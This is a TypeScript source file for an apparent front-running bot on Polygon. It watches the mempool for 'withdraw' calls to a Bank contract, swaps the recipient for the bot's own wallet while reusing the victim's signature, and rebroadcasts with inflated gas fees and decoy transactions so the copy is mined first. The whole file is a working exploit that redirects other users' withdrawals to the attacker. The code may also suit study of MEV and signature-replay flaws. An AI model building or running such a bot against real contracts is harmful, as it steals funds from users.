import "dotenv/config";
import { getAlchemyClient } from "./rpc-service/Alchemy";
import { getPolygonGasStationprice } from "./gas-price/PolygonGasStation";
import {
  BANK_CONTRACT_ADDRESS,
  decodeWithdrawFnParameters,
  encodeWithdrawFnParameters,
  WITHDRAW_FN_GAS_LIMIT,
} from "./BankContract";
import {
  getAlchemyWalletClient,
  getPublicClient,
} from "./rpc-service/ViemClient";
import {
  PendingSubscriptionTxInfo,
  subscribeToWithdrawPendingTx,
} from "./rpc-service/Listener";
import { BigNumber } from "ethers";
import { sendBundledTransactions } from "./rpc-service/BundleRelay";
import logger from "./utils/logger";
import { broadcastTransactionWithDummyTxs } from "./rpc-service/Broadcast";
import { polygon } from "viem/chains";
import { getBlockNativePolygonGasPrice } from "./gas-price/BlockNative";

const alchemySdkClient = getAlchemyClient();
const walletClient = getAlchemyWalletClient();
const publicClient = getPublicClient({
  wsRpcUrl: process.env.ALCHEMY_WEBSOCKET_RPC_URL as string,
});

// Account definitely exists, since its created from a private key
const walletAccount = walletClient.account!;

// Polygon gas price, for broadcasting transactions
let polygonMaxFeePerGas: bigint = BigInt(0);
let polygonMaxPriorityFeePerGas: bigint = BigInt(0);
let polygonEstimatedBaseFee: bigint = BigInt(0);
let walletNonce: number = 0;

// Defaults to false (not to bundle via Marlin Relay)
const shouldBundleViaMarlinRelay =
  (process.env.ENABLE_MARLIN ?? "false") === "true";

const pollPolygonGasPrice = () => {
  const fetchPolygonGasPrice = async () => {
    try {
      const { maxPriorityFeePerGas, maxFeePerGas, estimatedBaseFee } =
        await getPolygonGasStationprice();
      polygonMaxFeePerGas = maxFeePerGas;
      polygonMaxPriorityFeePerGas = maxPriorityFeePerGas;
      polygonEstimatedBaseFee = estimatedBaseFee;
    } catch (e) {
      // Fallback to BlockNative API
      const { maxPriorityFeePerGas, maxFeePerGas, estimatedBaseFee } =
        await getBlockNativePolygonGasPrice();
      polygonMaxFeePerGas = maxFeePerGas;
      polygonMaxPriorityFeePerGas = maxPriorityFeePerGas;
      polygonEstimatedBaseFee = estimatedBaseFee;
    }
  };

  fetchPolygonGasPrice();
  // Periodically fetch Polygon gas price from Polygon Gas Station API
  setInterval(fetchPolygonGasPrice, 25_000);
};

// Update nonce every 60s, avoid "eth_getTransactionCount" extra RPC call
const pollNonce = () => {
  const fetchNonce = async () => {
    walletNonce = await publicClient.getTransactionCount({
      address: walletAccount!.address,
    });
  };

  fetchNonce();
  setInterval(fetchNonce, 60_000);
};

/**
 * Listens to pending transactions in mempool that call "withdraw" function on Bank contract
 * Front runs the "withdraw" transaction with PGA, to set the receiver to the MEV account
 * @param txDetails
 */
const handleWithdrawTransaction = async (
  txDetails: PendingSubscriptionTxInfo,
) => {
  logger.info(
    `Transaction ${txDetails.hash} received at: ${new Date().toISOString()}`,
  );

  // Decode the transaction "data" field
  const withdrawFnParams = decodeWithdrawFnParameters(txDetails.input);
  const [data, signature] = withdrawFnParams;

  // Encode the transaction "data" field, with the new value for "recipient"
  const modifiedInputTxData = encodeWithdrawFnParameters(
    data,
    signature,
    walletAccount!.address,
  );

  // Broadcast the transaction to the network with higher gas fees for PGA
  // Ensure that this is higher than the original "withdraw" transaction & dummy transactions
  const maxPriorityFeePerGas =
    txDetails.maxPriorityFeePerGas ?? polygonMaxPriorityFeePerGas;
  const bumpedMaxPriorityFeePerGas = maxPriorityFeePerGas * BigInt(3);
  const bumpedMaxFeePerGas =
    (polygonEstimatedBaseFee * BigInt(3)) / BigInt(2) +
    bumpedMaxPriorityFeePerGas;

  try {
    logger.info(`Broadcasting transaction to network...`);

    if (shouldBundleViaMarlinRelay) {
      // Broadcast via "eth_sendBundle" RPC method, defaults to false
      // Marlin relay is temporarily down for maintenance, until further notice
      const sentBundledTxResult = await sendBundledTransactions(
        {
          maxPriorityFeePerGas: BigNumber.from(
            polygonMaxPriorityFeePerGas.toString(),
          ),
          maxFeePerGas: BigNumber.from(polygonMaxFeePerGas.toString()),
          data,
        },
        2,
      );

      logger.info(`Transaction ${sentBundledTxResult} broadcasted to network`);
    } else {
      // 30% increase in gas fees for dummy transactions
      const dummyMaxPriorityFeePerGas =
        (maxPriorityFeePerGas * BigInt(13)) / BigInt(10);
      const dummyMaxFeePerGas =
        (polygonEstimatedBaseFee * BigInt(13)) / BigInt(10) +
        dummyMaxPriorityFeePerGas;

      const txHash = await broadcastTransactionWithDummyTxs(
        {
          account: walletAccount,
          chain: polygon,
          data: modifiedInputTxData,
          to: BANK_CONTRACT_ADDRESS,
          maxFeePerGas: bumpedMaxFeePerGas,
          maxPriorityFeePerGas: bumpedMaxPriorityFeePerGas,
          nonce: walletNonce,
          gas: WITHDRAW_FN_GAS_LIMIT,
        },
        // For dummy transactions, we want it to be higher than the original "withdraw" transaction but lower than the MeV transaction
        {
          dummyMaxFeePerGas,
          dummyMaxPriorityFeePerGas,
        },
      );

      logger.info(`Transaction ${txHash} broadcasted to network`);

      // Wait for the transaction to be mined
      const txReceipt = await publicClient.waitForTransactionReceipt({
        hash: txHash,
      });

      if (txReceipt.status === "success") {
        logger.info(
          `Transaction ${txReceipt.transactionHash} mined successfully!`,
        );
      } else {
        logger.error(
          `Failed to frontrun "withdraw" transaction, txHash: ${txReceipt.transactionHash}`,
        );
      }
    }
  } catch (e) {
    // Log the error, but don't throw it
    logger.error(e);
  }
};

// Periodically fetch nonce & Polygon gas price
pollNonce();
pollPolygonGasPrice();

// Subscribe to pending transactions in mempool that call "withdraw" function on Bank contract
subscribeToWithdrawPendingTx(handleWithdrawTransaction);

// Clean up when the process is terminated
process.on("SIGINT", () => {
  // Remove dangling listeners
  alchemySdkClient.ws.removeAllListeners();
  process.exit();
});

// - Retry mechanisms
// - Include husky
// - Write README.md
